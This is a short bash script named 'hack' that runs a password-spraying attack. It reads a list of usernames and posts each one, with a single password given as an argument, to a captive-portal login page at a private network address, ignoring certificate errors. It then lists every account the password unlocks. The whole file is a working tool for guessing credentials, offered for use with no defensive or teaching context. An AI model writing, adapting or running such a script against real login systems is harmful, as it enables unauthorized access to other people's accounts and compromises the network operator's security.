#!/bin/bash
# usage : ./hack <password> < < the input file with usenames in each line>

i=0
found=0
result=""

read user
while [ "$user" != "q" ]
do
	r=$(curl https://10.1.0.10:8090/httpclient.html -k -s --data username="$user" --data password="$1" --data mode="191");
	t=`echo $r | grep -o "You have successfully logged in"`;
	if [ "$t" = "You have successfully logged in" ];
	then
		result="$result\n$user";
		echo $user
		found=`echo $found + 1 |bc`;
	fi
	read user;
	i=`echo $i+1 | bc`;
	printf 'Searched %d users and found %d matches.\r' $i $found;
done
printf "\f\nThese were the users with password $1 : ";
printf "$result\n";
